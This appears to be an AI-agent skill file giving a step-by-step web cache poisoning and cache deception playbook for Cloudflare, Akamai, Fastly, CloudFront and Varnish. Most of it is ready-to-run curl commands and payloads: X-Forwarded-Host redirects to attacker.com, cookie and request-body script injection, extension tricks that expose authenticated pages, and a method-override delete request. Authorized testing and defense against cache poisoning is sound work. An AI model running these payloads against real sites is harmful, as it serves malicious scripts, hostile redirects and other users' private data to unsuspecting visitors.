---
name: web-cache-poisoning
description: ULTIMATE Web Cache Poisoning methodology — unkeyed headers, cache deception, CDN-specific bypasses, cache key manipulation.
---

# ULTIMATE Web Cache Poisoning Methodology

> **Trigger:** Load this skill when a target uses a CDN (Cloudflare, Akamai, Fastly, CloudFront) or reverse proxy cache (Varnish, Nginx, Apache). Test EVERY in-scope endpoint for cache poisoning — it is often a path to stored XSS, account takeover, or data exfiltration.

---

## 0. How Cache Keys Work (The Foundation)

A cache key is the fingerprint the cache uses to decide "have I seen this request before?" If the request matches an existing cache key, the cache serves the stored response without hitting the backend.

**What is TYPICALLY keyed:**
- Host header
- Path + query string
- HTTP method (GET, POST, etc.)
- For some caches: single Vary header (e.g., `Vary: Accept-Encoding`)

**What is typically UNKEYED (the goldmine):**
- Most other headers (X-Forwarded-Host, X-Original-URL, Cookie, User-Agent, Referer, Accept, Origin, etc.)
- HTTP/2 pseudo-headers (`:authority`, `:scheme`, `:path` in some configurations)
- The request body (in some edge cases)
- Uncommon query parameters if the cache normalizes the URL differently than the backend

**The attack premise:** If you can change an unkeyed input that the backend uses to generate a response, and the cache stores that response under a key that does NOT include your input, future victims will get your poisoned response.

---

## 1. Recon — Identify Cache Presence and Behavior

### 1.1 Detect the cache layer
```bash
# Hit an endpoint twice and compare headers
curl -sI "https://TARGET/" | tee /tmp/cache-hit1.txt
curl -sI "https://TARGET/" | tee /tmp/cache-hit2.txt

# Look for these cache indicators:
# - CF-Cache-Status: HIT/MISS (Cloudflare)
# - X-Cache: HIT/MISS (Akamai, Fastly, generic)
# - X-Cache-Hits: 0+ (Fastly/Varnish)
# - Age: seconds since cached
# - Cache-Control, Surrogate-Control, X-Served-By, X-Timer
# - Akamai: X-True-Cache-Key, X-Check-Cacheable
# - CloudFront: X-Cache, Via: 1.1 xxxx.cloudfront.net
```

### 1.2 Confirm cache key behavior
```bash
# Inject a unique unkeyed header and see if the cache serves it to others
# This is the core detection loop:
UNIQ=$(openssl rand -hex 8)
# Request 1: poison
curl -s -H "X-Forwarded-Host: evil-$UNIQ.com" "https://TARGET/somepage"

# Request 2: normal request from another IP/session, same cache key
curl -s "https://TARGET/somepage" | grep -i "evil-$UNIQ"
# If the poison appears, you have cache poisoning
```

### 1.3 Identify cache TTL (time-to-live)
```bash
# Check Age header to see how long responses are cached
# If Age: 300, you have 5 minutes before the poison expires
# Short TTL = race condition; Long TTL = persistent poison
```

---

## 2. Unkeyed Header Exploitation (Primary Attack Surface)

### 2.1 X-Forwarded-Host poisoning
```bash
# X-Forwarded-Host often influences absolute URLs in redirects,
# Open Graph tags, canonical links, JSON API references, and CSP headers

# Step 1: Send poison
curl -s -H "X-Forwarded-Host: attacker.com" \
  "https://TARGET/login?redirect=/dashboard"

# Step 2: Victim requests the same page, gets redirect to attacker.com
curl -s -I "https://TARGET/login?redirect=/dashboard"
# Location: https://attacker.com/dashboard

# Impact chains:
# - Open redirect -> OAuth code theft -> account takeover
# - CSP header reflects X-Forwarded-Host -> CSP bypass -> XSS
# - <link rel="canonical"> points to attacker.com -> SEO manipulation
# - Password reset email links use X-Forwarded-Host -> token theft
```

### 2.2 X-Original-URL / X-Rewrite-URL poisoning
```bash
# Some backends use these headers to override the request path.
# If the cache keys on the real path but the backend serves a
# DIFFERENT path based on the header, you can poison any path.

# Example: Poison /index.html to serve /admin content
curl -s -H "X-Original-URL: /admin" "https://TARGET/index.html"

# Victim accesses /index.html -> gets cached /admin response
# This is especially dangerous if the cache normalizes the path
# differently than the backend.
```

### 2.3 Unkeyed Cookie poisoning
```bash
# If cookies are unkeyed but reflected in the response body,
# you can store XSS or serve attacker-controlled content.

UNIQ=$(openssl rand -hex 4)
curl -s -b "tracking=$UNIQ" \
  -H "X-Cache-Buster: $(date +%s)" \
  "https://TARGET/analytics.js"

# If analytics.js contains: document.write("<img src='/track?c=" + getCookie('tracking') + "'>");
# And cookies are unkeyed -> stored XSS on every victim loading that JS
```

### 2.4 Origin / Referer poisoning
```bash
# Some APIs reflect the Origin header in Access-Control-Allow-Origin
# or in error messages. If Origin is unkeyed:

curl -s -H "Origin: https://attacker.com" "https://TARGET/api/user"

# Poisoned CORS header -> victim's browser trusts attacker.com
# Or poisoned error message -> reflected XSS in cached error page
```

### 2.5 Accept / Accept-Encoding poisoning
```bash
# If the cache keys on Accept but the backend generates different
# content based on Accept-Encoding (or vice versa):

curl -s -H "Accept: text/html" -H "Accept-Encoding: attacker" \
  "https://TARGET/api/data"

# Can cause cache to store an error response that gets served
# to real users requesting application/json.
```

---

## 3. Web Cache Deception (WCD)

> **Concept:** Trick the cache into storing a sensitive, authenticated response at a public cache key, then retrieve it unauthenticated.

### 3.1 The classic WCD attack
```bash
# A user's /profile page should be private.
# But if the cache keys on file extension and the path ends in .css:

# Victim (authenticated) visits:
# https://TARGET/profile/settings.css
# Backend ignores .css, serves /profile/settings HTML
# Cache sees .css and stores it as a CSS file (public, long TTL)

# Attacker (unauthenticated) retrieves:
curl -s "https://TARGET/profile/settings.css"
# Gets the victim's cached /profile/settings HTML with PII
```

### 3.2 Extension confusion vectors
```bash
# Try appending these to authenticated endpoints:
# /profile.php -> /profile.php/anything.css
# /api/user -> /api/user;v=1.css
# /admin/panel -> /admin/panel%00.css
# /settings -> /settings/.css
# /account -> /account/..;/styles.css

# The backend may normalize the path and serve the original page,
# but the cache keys on the full URL including .css
```

### 3.3 Path normalization differential
```bash
# Cache and backend may normalize differently:
# Backend: /profile/../settings -> /settings
# Cache: keys on raw path /profile/../settings

# Also try:
# /settings/.;/styles.css
# /settings/..%2fstyles.css
# /settings/%2e%2e/styles.css
```

---

## 4. CDN-Specific Bypasses and Behaviors

### 4.1 Cloudflare
```bash
# Cloudflare caches by default on static extensions.
# It does NOT cache HTML by default unless Page Rules say so.

# Key behaviors:
# - CF-Cache-Status: DYNAMIC = not cached
# - CF-Cache-Status: HIT = cached
# - CF-RAY header: identify the datacenter

# Cloudflare bypasses:
# 1. If the backend returns Cache-Control: public with a max-age,
#    Cloudflare may cache HTML unexpectedly.
# 2. Use the __cf_chl_jschl_tk__ parameter (challenge bypass not reliable).
# 3. Try HTTP/2 request smuggling (H2.TE) to poison through Cloudflare.
# 4. Workers routes can be poisoned if unkeyed inputs are used in Worker logic.

# Test specifically:
curl -s -I -H "X-Forwarded-Host: evil.com" "https://TARGET/page"
# If the response reflects evil.com and CF-Cache-Status goes HIT after
# a second request, Cloudflare is caching the poison.
```

### 4.2 Akamai
```bash
# Akamai has aggressive caching and complex cache key rules.
# Look for: X-Cache: HIT from [hostname], X-True-Cache-Key

# Akamai-specific vectors:
# - Akamai EdgeSuite often strips some headers before they reach origin
# - But X-Forwarded-* headers are usually forwarded
# - Test Akamai's "Prefetch" behavior: if a page is prefetched,
#   unkeyed inputs from the prefetch request may poison the cache

# Poison the prefetch:
curl -s -H "X-Forwarded-Host: attacker.com" \
  -A "AkamaiEdgeSuite/1.0" \
  "https://TARGET/"
```

### 4.3 Fastly
```bash
# Fastly uses Varnish under the hood.
# Headers: X-Cache: HIT, X-Cache-Hits: N, X-Served-By

# Fastly allows extensive cache key customization via VCL.
# Common mistake: VCL adds headers to the hash but not all headers.

# Fastly-specific:
# - Surrogate-Key header can be manipulated if unkeyed
# - If the backend uses req.http.Cookie but the cache key ignores it,
#   cookie-based poisoning works beautifully

# Test for Vary header mishandling:
curl -s -I -H "Accept: application/json" "https://TARGET/"
# If Vary: Accept but the cache ignores it -> content-type confusion poisoning
```

### 4.4 CloudFront
```bash
# CloudFront caches based on cache policy.
# Default cache key: Host, path, query string
# Can be extended to include headers, cookies, query strings.

# If the cache policy does NOT include a header that the origin uses:
# That's your unkeyed input.

# CloudFront-specific:
# - Lambda@Edge can introduce unkeyed inputs into the response
# - If Lambda@Edge uses headers not in the cache key -> poisonable
# - Origin Shield adds another caching layer with its own key

# Check headers:
# Via: 1.1 xxxx.cloudfront.net ( indicates CloudFront )
# X-Cache: Hit from cloudfront
```

### 4.5 Varnish
```bash
# Varnish is highly configurable but often misconfigured.
# Default: caches GET/HEAD, ignores most headers in the key.

# Varnish sends:
# - X-Varnish: N (transaction ID)
# - Age: seconds
# - Via: 1.1 varnish

# If you see X-Varnish: N N (two IDs), the response came from cache.

# Varnish is PARTICULARLY vulnerable to:
# - X-Forwarded-Host reflection (very common default behavior)
# - Cookie poisoning ( cookies often stripped from key )
# - Accept-Language poisoning ( if backend localizes based on it )
```

---

## 5. Cache Key Manipulation via Parameter Pollution

### 5.1 Query string normalization differential
```bash
# Cache normalizes ?a=1&a=2 differently than the backend
# Example:
# - Cache key includes all parameters in order
# - Backend uses first or last occurrence of a parameter

# If the attacker sends:
curl -s "https://TARGET/search?q=safe&q=<script>alert(1)</script>"

# And the backend reflects the SECOND q but the cache keys on the FIRST q,
# or vice versa — the poison is stored under the wrong key.
```

### 5.2 Parameter order poisoning
```bash
# Some caches sort query parameters alphabetically, some don't.
# If the backend uses parameter order to determine content:

curl -s "https://TARGET/api?format=json&evil=1"
curl -s "https://TARGET/api?evil=1&format=json"
# If the cache normalizes order but the backend does not -> poisoning window
```

### 5.3 Encoded parameter poisoning
```bash
# Cache decodes once, backend decodes twice (or vice versa)
curl -s "https://TARGET/page?next=%252fadmin"
# If cache keys on %252fadmin but backend decodes to /admin ->
# the backend serves /admin content under the cache key for %252fadmin
```

---

## 6. Cookie-Based Cache Poisoning (Advanced)

```bash
# If the cache key ignores cookies but the backend reflects them,
# you can achieve stored XSS or content injection.

# Step 1: Identify cookie reflection
UNIQ=$(openssl rand -hex 6)
curl -s -b "session=poison-$UNIQ" "https://TARGET/welcome" | grep "poison-$UNIQ"

# Step 2: If reflected, try XSS payload
curl -s -b "session=<script>alert(document.cookie)</script>" \
  "https://TARGET/welcome"

# Step 3: Victim loads /welcome with normal cookies -> gets YOUR XSS payload
# because the cache key did not include the cookie.

# Look for these reflected cookie contexts:
# - Analytics tracking pixels
# - Personalization messages ("Welcome back, [cookie value]")
# - CSRF tokens (if token is reflected in form without being keyed)
# - A/B test identifiers
# - Language/region cookies
```

---

## 7. RCC — Request Cache Collapse (HTTP/2)

> **Concept:** HTTP/2's multiplexed streams can be abused to confuse the cache about which request/response pair belongs to which stream, causing one response to be cached for a different request.

### 7.1 HTTP/2 stream confusion basics
```bash
# In HTTP/2, multiple requests share a single TCP connection.
# If the cache or backend mishandles stream IDs, responses can be misattributed.

# This is especially potent when:
# - The frontend (CDN) speaks HTTP/2 to the client but HTTP/1.1 to the backend
# - The HTTP/1.1 backend doesn't preserve stream ordering
# - The cache keys on the HTTP/2 request but stores the HTTP/1.1 response

# Tools to test:
# Use Burp Repeater with HTTP/2 or custom h2 client scripts
# Look for responses that don't match the request path
```

### 7.2 HTTP/2 pseudo-header poisoning
```bash
# HTTP/2 pseudo-headers (:authority, :scheme, :path, :method) are
# sometimes treated as unkeyed by caches, especially in downgraded scenarios.

# If :authority is unkeyed:
:method GET
:path /api/user
:authority attacker.com
:scheme https

# Backend generates response for attacker.com but cache keys on host header
# which might still be the real host.
```

---

## 8. Tool Methodology

### 8.1 Param Miner (Burp Extension)
```bash
# Param Miner is the gold standard for detecting unkeyed inputs.
# Steps:
# 1. Install Param Miner in Burp Suite
# 2. Right-click any request -> Extensions -> Param Miner -> Guess headers
# 3. Param Miner will send thousands of variants and report which
#    headers caused a cache HIT vs MISS, indicating unkeyed input
# 4. After unkeyed headers are identified, test for reflection
```

### 8.2 Manual detection workflow
```bash
# Step 1: Identify cache presence
for header in CF-Cache-Status X-Cache X-Cache-Hits Age X-Varnish; do
  curl -sI "https://TARGET/" | grep -i "$header"
done

# Step 2: Identify cache key components
# Send two requests differing by one header each time.
# If response is a cache HIT despite header change, that header is unkeyed.

HEADERS=(
  "X-Forwarded-Host"
  "X-Original-URL"
  "X-Rewrite-URL"
  "X-Forwarded-Scheme"
  "X-HTTP-Host-Override"
  "Forwarded"
  "Origin"
  "Referer"
  "Cookie"
  "User-Agent"
  "Accept"
  "Accept-Encoding"
  "Accept-Language"
)
for h in "${HEADERS[@]}"; do
  UNIQ=$(openssl rand -hex 4)
  curl -s -H "$h: poison-$UNIQ" "https://TARGET/page" | grep "poison-$UNIQ"
done
```

### 8.3 Cache buster technique
```bash
# When testing, use a cache buster to force MISS on your poison request
# Then remove the buster to see if the poison persists on subsequent HITs.

curl -s -H "X-Forwarded-Host: evil.com" \
  "https://TARGET/page?cb=$(date +%s)"

# Now request without cb:
curl -s "https://TARGET/page" | grep "evil.com"
# If poison appears, it survived in cache.
```

---

## 9. PortSwigger Research — Unkeyed Inputs Beyond Headers

> James Kettle's research at PortSwigger uncovered that modern caches also key (or fail to key) on unconventional inputs.

### 9.1 HTTP/2 pseudo-headers as unkeyed inputs
```bash
# In HTTP/2 downgrades, :authority may be treated differently than Host.
# Some caches key on Host but the backend uses :authority.
# If you can manipulate :authority independently of Host -> poison.

# Test with:
:method GET
:path /api/data
:scheme https
:authority attacker-controlled.com
host real-target.com
```

### 9.2 Method override poisoning
```bash
# Some backends respect X-HTTP-Method-Override to change the effective method.
# If the cache keys on GET but the backend processes it as POST:

curl -s -X GET -H "X-HTTP-Method-Override: POST" \
  -d "action=delete&user=1" \
  "https://TARGET/api/users"

# Victim sends GET -> gets poisoned POST response (state change or error)
```

### 9.3 Fat GET / POST poisoning
```bash
# Some caches ignore the body of a GET request but the backend processes it.
# Send a GET with a body that influences the response:

curl -s -X GET -d "<script>alert(1)</script>" \
  "https://TARGET/search"

# If cache keys on path + method only, the body is unkeyed -> poison.
```

---

## 10. Evidence Collection — Before/After Comparison

### 10.1 Document the poison injection
```bash
# Always save the exact poison request:
cat > /tmp/poison-request.txt << 'REQ'
GET /login HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

REQ
```

### 10.2 Document the victim retrieval
```bash
# Save the victim request (no poison headers):
cat > /tmp/victim-request.txt << 'REQ'
GET /login HTTP/1.1
Host: target.com

REQ
```

### 10.3 Capture the poisoned response
```bash
# Save the response that contains the poison:
curl -s -D /tmp/poisoned-response-headers.txt \
  -o /tmp/poisoned-response-body.html \
  "https://TARGET/login"

# Verify the poison is present:
grep -i "attacker.com" /tmp/poisoned-response-body.html
```

### 10.4 Show cache status transition
```bash
# Before poisoning: cache status should be MISS or DYNAMIC
curl -sI "https://TARGET/login" | grep -i "cache"

# After poisoning: cache status should be HIT
curl -sI "https://TARGET/login" | grep -i "cache"

# The presence of the poison on a HIT proves successful cache poisoning.
```

### 10.5 Chain to impact
```bash
# If X-Forwarded-Host poison caused redirect:
grep -i "location" /tmp/poisoned-response-headers.txt
# Location: https://attacker.com/login

# If cookie poison caused XSS:
grep -i "<script>" /tmp/poisoned-response-body.html
```

---

## 11. Quick Reference — Cache Poisoning Checklist

| Step | Test | If positive |
|------|------|-------------|
| 1 | Detect cache headers | Note cache type and TTL |
| 2 | Test X-Forwarded-Host reflection | Try redirect / Open Graph / CSP chains |
| 3 | Test X-Original-URL / X-Rewrite-URL | Try path override poisoning |
| 4 | Test Cookie reflection | Try stored XSS via cookie |
| 5 | Test Origin / Referer reflection | Try CORS poison or error XSS |
| 6 | Test WCD on authenticated pages | Append .css / .js to profile endpoints |
| 7 | Test parameter pollution | Duplicate params with different values |
| 8 | Test HTTP/2 pseudo-headers | Try :authority confusion |
| 9 | Run Param Miner | Identify all unkeyed inputs automatically |
| 10 | Verify victim impact | Request from clean session, confirm poison persists |

---

## 12. Remediation Notes (For Report Writing)

- Cache keys MUST include any input that influences the response body or headers.
- Do NOT reflect unkeyed headers into redirects, CSP, or HTML without validation.
- Use `Vary` header correctly — but remember that not all caches respect it.
- Disable caching on authenticated/sensitive endpoints entirely (`Cache-Control: private, no-store`).
- Normalize URL paths consistently between cache and backend.
- Key cookies if they affect the response.

